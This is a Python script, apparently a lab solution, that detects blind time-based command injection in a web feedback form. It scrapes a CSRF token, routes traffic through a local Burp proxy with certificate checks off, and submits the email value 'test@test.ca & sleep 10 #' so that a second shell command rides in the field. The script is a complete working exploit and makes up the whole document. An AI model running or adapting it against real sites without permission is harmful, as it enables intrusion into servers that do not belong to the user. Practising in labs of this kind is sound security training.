import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
#sending to burp proxy
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    #path
    feedback_path = 'feedback'
    #get request is made to the respective url. 
    r = s.get(url + feedback_path, verify=False, proxies=proxies)
    #Bs instance created and html contents of the respective url is parsed.
    soup = BeautifulSoup(r.text, 'html.parser')
    #finds the particular tag 
    csrf = soup.find("input")['value']
    return csrf

def check_command_injection(s, url):

    submit_feedback_path = 'feedback/submit'
    command_injection = 'test@test.ca & sleep 10 #'
    csrf_token = get_csrf_token(s, url)
    data = {'csrf': csrf_token, 'name': 'test', 'email': command_injection, 'subject': 'test', 'message': 'test'}
    #post request
    res = s.post(url + submit_feedback_path, data=data, verify=False, proxies=proxies)
    if (res.elapsed.total_seconds() >=10):
        print("(+) Email field vulnerable to time-based command injection!")
    else:
        print("(-) Email field not vulnerable to time-based command injection")

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Checking if email parameter is vulnerable to time-based command injection...")

    s = requests.Session()
#check cmd Inj function call
    check_command_injection(s, url)

if __name__ == "__main__":
    main()
